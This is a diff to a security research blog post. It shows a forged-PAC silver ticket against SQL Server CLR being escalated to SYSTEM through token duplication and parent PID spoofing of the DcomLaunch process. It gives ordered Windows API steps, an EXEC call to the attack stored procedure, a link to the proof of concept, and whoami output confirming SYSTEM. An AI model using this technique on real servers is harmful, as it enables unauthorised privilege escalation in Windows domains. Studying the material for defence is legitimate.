@@ -48,7 +48,7 @@ Privilege Name                Description
 ...
 ```
 
-So the question was - why does `OPENROWSET(BULK)` work?
+So the question was - why does `OPENROWSET(BULK)` have more privileged access?
 
 ## First Attempt: Thread Token
 
@@ -105,14 +105,26 @@ The trick is to go through `.Impersonate()` first. `WindowsIdentity.Impersonate(
 2. `.Impersonate()` - sets the thread impersonation token
 3. `OpenThreadToken(TOKEN_ALL_ACCESS)` - fresh handle with full access
 4. `DuplicateTokenEx` - convert to primary token
-5. `Undo()` the managed impersonation
-6. `CreateProcessAsUser` with the primary token
+5. `.Undo()` - revert managed impersonation immediately
 
-The launched process runs with all the privileges and group memberships from the forged PAC.
+At this point we have a usable primary token with all the forged PAC privileges. We can't call `CreateProcessAsUser` with it directly - that API requires `SeAssignPrimaryTokenPrivilege`, which is only assigned to SYSTEM, NETWORK SERVICE and LOCAL SERVICE via local security policy - not to Domain Admins.
+
+Instead, we use parent PID spoofing. The silver ticket token has `SeDebugPrivilege` from the forged admin group membership, which lets us open any process regardless of its security descriptor. We open a SYSTEM process and use it as the parent for `CreateProcess` - the child inherits the parent's primary token:
+
+6. `ImpersonateLoggedOnUser(silverToken)` - native impersonation (not tracked by CLR host)
+7. `QueryServiceStatusEx("DcomLaunch")` + `OpenProcess(PROCESS_ALL_ACCESS)` - get handle to SYSTEM process (succeeds via `SeDebugPrivilege`)
+8. `RevertToSelf()` - done with impersonation, keep the process handle
+9. `CreateProcess` with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` = DcomLaunch handle - child inherits SYSTEM token
+
+When `CreateProcess` is called with an explicit parent via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`, the kernel creates the child process with a token inherited from the designated parent - not the caller. This bypasses the `SeAssignPrimaryTokenPrivilege` requirement entirely since no explicit token assignment occurs.
+
+There are two important CLR hosting constraints to be aware of: SQL Server's CLR host tracks managed impersonation (`WindowsImpersonationContext`) and will abort execution if it's held too long. The `.Undo()` in step 5 must happen promptly. For the `OpenProcess` call (step 6-7), we use the native `ImpersonateLoggedOnUser`/`RevertToSelf` APIs instead, which the CLR host does not monitor.
+
+The spawned process runs as `NT AUTHORITY\SYSTEM` with full privileges.
 
 ## Proof of Concept
 
-This CLR stored procedure implements the technique. It takes a process and arguments, extracts the privileged token and launches the process with `CreateProcessAsUser`: [https://gist.github.com/xct/8e0051caa54993c21757c72e0597e86c](https://gist.github.com/xct/8e0051caa54993c21757c72e0597e86c).
+This CLR stored procedure implements the technique. It takes a process and arguments, extracts the privileged token and uses parent PID spoofing to spawn the command as SYSTEM: [https://gist.github.com/xct/8e0051caa54993c21757c72e0597e86c](https://gist.github.com/xct/8e0051caa54993c21757c72e0597e86c).
 
 ### Building and Deploying
 
@@ -208,62 +220,57 @@ We then execute it:
 ```sql
 EXEC dbo.silver_token_exec @process = N'whoami', @arguments = N'/all';
 ...
-[*] Process token privileges:
-    SeIncreaseQuotaPrivilege (Disabled)
-    SeChangeNotifyPrivilege (Enabled)
-    SeCreateGlobalPrivilege (Enabled)
-    SeIncreaseWorkingSetPrivilege (Disabled)
+[+] Admin group membership confirmed
+[*] Impersonating caller identity...
+[+] Primary token obtained from forged PAC identity
+[*] Getting DcomLaunch process handle...
+[+] DcomLaunch PID: 872
+[+] Got handle to DcomLaunch
+[*] Command: whoami /all
+[+] Spawned process PID 4288 as child of DcomLaunch (SYSTEM)
 
-[+] SqlContext identity: SIGNED\mssqlsvc
+USER INFORMATION
+----------------
 
-[*] Caller token privileges:
-    SeIncreaseQuotaPrivilege (Enabled)
-    SeMachineAccountPrivilege (Enabled)
-    SeSecurityPrivilege (Enabled)
-    SeTakeOwnershipPrivilege (Enabled)
-    SeLoadDriverPrivilege (Enabled)
-    SeSystemProfilePrivilege (Enabled)
-    SeSystemtimePrivilege (Enabled)
-    SeProfileSingleProcessPrivilege (Enabled)
-    SeIncreaseBasePriorityPrivilege (Enabled)
-    SeCreatePagefilePrivilege (Enabled)
-    SeBackupPrivilege (Enabled)
-    SeRestorePrivilege (Enabled)
-    SeShutdownPrivilege (Enabled)
-    SeDebugPrivilege (Enabled)
-    SeSystemEnvironmentPrivilege (Enabled)
-    SeChangeNotifyPrivilege (Enabled)
-    SeRemoteShutdownPrivilege (Enabled)
-    SeUndockPrivilege (Enabled)
-    SeEnableDelegationPrivilege (Enabled)
-    SeManageVolumePrivilege (Enabled)
-    SeImpersonatePrivilege (Enabled)
-    SeCreateGlobalPrivilege (Enabled)
-    SeIncreaseWorkingSetPrivilege (Enabled)
-    SeTimeZonePrivilege (Enabled)
-    SeCreateSymbolicLinkPrivilege (Enabled)
-    SeDelegateSessionUserImpersonatePrivilege (Enabled)
+User Name           SID     
+=================== ========
+nt authority\system S-1-5-18
 
-[*] Caller token groups:
-    S-1-5-21-4088429403-1159899800-2753317549-512 (Enabled) ***
-    S-1-1-0 (Enabled)
-    S-1-5-32-544 (Enabled) ***
-    S-1-5-32-554 (Enabled)
-    S-1-5-32-545 (Enabled)
-    S-1-5-2 (Enabled)
-    S-1-5-11 (Enabled)
-    S-1-5-15 (Enabled)
-    S-1-5-21-4088429403-1159899800-2753317549-513 (Enabled)
-    S-1-5-21-4088429403-1159899800-2753317549-518 (Enabled)
-    S-1-5-21-4088429403-1159899800-2753317549-519 (Enabled)
-    S-1-5-21-4088429403-1159899800-2753317549-520 (Enabled)
-    S-1-5-21-4088429403-1159899800-2753317549-1105 (Enabled)
-    S-1-5-21-4088429403-1159899800-2753317549-2345841878 (Enabled)
-    S-1-5-21-4088429403-1159899800-2753317549-4100997547 (Enabled)
-    S-1-5-21-4088429403-1159899800-2753317549-1052248003 (Enabled)
-    S-1-5-21-4088429403-1159899800-2753317549-1466107430 (Enabled)
-    S-1-16-12288 (Disabled)
 ...
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled 
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeAuditPrivilege                          Generate security audits                                           Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
+SeTimeZonePrivilege                       Change the time zone                                               Enabled 
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
 ```
 
 ## Why This Works
@@ -274,7 +281,7 @@ Three properties come together here:
 
 **SQL Server builds a real Windows token from the PAC.** When a Kerberos-authenticated client connects, SQL Server delegates to the Windows security subsystem to create a logon session. The resulting token reflects the PAC groups verbatim. There is no independent validation against Active Directory.
 
-**`SqlContext.WindowsIdentity` exposes this token to CLR code.** The `WindowsIdentity` object wraps the real Windows token from the authenticated session. The `.Impersonate()` -> `OpenThreadToken` -> `DuplicateTokenEx` sequence gives us a usable primary token with full access rights.
+**`SqlContext.WindowsIdentity` exposes this token to CLR code.** The `WindowsIdentity` object wraps the real Windows token from the authenticated session. The `.Impersonate()` -> `OpenThreadToken` -> `DuplicateTokenEx` sequence gives us a usable primary token with full access rights. The forged admin group membership grants `SeDebugPrivilege`, which lets us open a SYSTEM process (DcomLaunch). Using this handle as the parent for `CreateProcess` via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`, the child inherits the parent's SYSTEM token - bypassing the `SeAssignPrimaryTokenPrivilege` requirement that blocks `CreateProcessAsUser`.
 
 ## References
 
